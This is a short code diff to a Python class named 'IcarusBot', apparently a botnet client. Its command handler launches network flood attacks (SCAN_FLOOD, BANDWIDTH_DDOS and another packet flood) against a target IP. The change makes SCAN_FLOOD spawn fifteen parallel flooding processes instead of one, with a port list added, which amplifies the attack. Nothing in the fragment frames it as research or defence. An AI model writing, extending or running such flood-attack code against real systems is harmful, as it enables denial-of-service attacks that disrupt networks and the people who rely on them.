@@ -239,14 +239,9 @@ class IcarusBot:
                                                      args=(target_ip, NUM_PACKETS_TO_SEND, portList))
                                 self.mp.start()
                         elif attack_type == 'SCAN_FLOOD':
-                            if self.mp is None:
+                            for n in range(0, 15):
                                 self.mp = mp.Process(target=scan_flood.SCAN_Flood,
-                                                     args=(target_ip, NUM_PACKETS_TO_SEND))
-                                self.mp.start()
-                            else:
-                                self.mp.terminate()
-                                self.mp = mp.Process(target=scan_flood.SCAN_Flood,
-                                                     args=(target_ip, NUM_PACKETS_TO_SEND))
+                                                     args=(target_ip, NUM_PACKETS_TO_SEND, portList))
                                 self.mp.start()
                         elif attack_type == 'BANDWIDTH_DDOS':
                             if self.mp is None:
